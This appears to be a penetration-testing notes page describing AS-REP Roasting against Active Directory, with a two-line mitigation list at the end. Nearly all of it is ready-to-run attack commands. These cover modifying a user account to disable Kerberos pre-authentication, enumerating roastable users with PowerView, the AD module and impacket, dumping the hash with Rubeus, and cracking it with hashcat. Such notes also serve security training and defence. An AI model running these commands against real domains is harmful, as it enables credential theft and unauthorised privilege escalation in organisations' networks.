---
title: "AS-REP Roasting"
description: "Privilege escalation using AS-REP Roasting."
lead: "Using AS-REP Roasting for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_privilege_escalation"
weight: 10
toc: true
---

## Overview

- Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication
- Users do not have to be service accounts
- Must have pre-authentication disabled
- Can request any authentication data (encrypted TGT) for any user since KDC skips validation
- Crack dumped hash with hashcat

## Exploitation

### Force Disable Kerberos Preauth

```powershell
# Using PowerView 3.0/dev
# Enumerate permissions for RDPUsers on ACLS
Invoke-ACLScanner -ResolveGUIDS | ?{ $_.IdentityReferenceName -match "RDPUsers" }

# Disable preauth for user
Set-DomainObject -Identity Control572User -XOR @{useraccountcontrol=4194304} -Verbose
```

### Enumerate Users with Preauth Disabled

```powershell
# Using PowerView 3.0/dev
Get-DomainUser -PreauthNotRequired -Verbose | Select samaccountname

# Using AD Module
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth

# Query AS-REP-roastable users with impacket from Kali host
# Supply userlist and don't require authentication
GetNPUsers.py -dc-ip 10.10.149.145 -k -no-pass -usersfile users.txt spookysec.local/

# Dump KRBASREP5 hash for specific user and output in hashcat format to file
.\Rubeus.exe asreproast /user:control572user /format:hashcat /outfile:control572user.asrep

# Transfer hash onto attacker and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
# Crack hash with hashcat
hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

## Mitigation

- Strong password policy
- Enable Kerberos Pre-Authentication
